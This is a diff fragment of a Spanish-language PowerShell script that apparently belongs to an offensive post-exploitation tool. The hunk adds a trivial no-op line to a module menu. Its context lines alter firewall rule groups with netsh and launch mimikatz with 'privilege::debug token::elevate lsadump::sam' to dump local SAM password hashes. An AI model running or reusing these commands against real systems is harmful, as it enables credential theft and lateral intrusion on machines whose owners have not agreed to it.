@@ -162,6 +162,7 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
         Write-Host "" ; powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit ; Write-Host "" ; pause }
         if($module -like '2') { $console ="true" ; Write-Host "Módulo cargado con éxito!" -ForegroundColor Green }
+	if($module -in '1','2') { $null }
         else { Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta }
         sleep -milliseconds 2000 ; Clear-Host }
 	
